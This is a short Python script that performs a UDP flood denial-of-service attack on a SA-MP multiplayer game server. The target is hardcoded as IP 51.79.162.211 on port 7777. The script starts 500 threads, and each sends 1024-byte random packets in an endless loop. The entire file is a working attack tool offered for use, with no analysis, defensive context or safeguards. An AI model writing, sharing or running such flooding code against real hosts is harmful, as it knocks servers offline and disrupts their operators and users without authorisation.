import threading  
import socket  
import random  

target_ip = "51.79.162.211"  # Replace with the SA-MP server IP  
target_port = 7777  # Default SA-MP port, change if needed  

def attack():  
    while True:  
        try:  
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
            bytes_to_send = random._urandom(1024)  # Random bytes for the attack  
            s.sendto(bytes_to_send, (target_ip, target_port))  
        except socket.error:  
            pass  

for i in range(500):  # Number of threads for simultaneous attacks  
    thread = threading.Thread(target=attack)  
    thread.start()
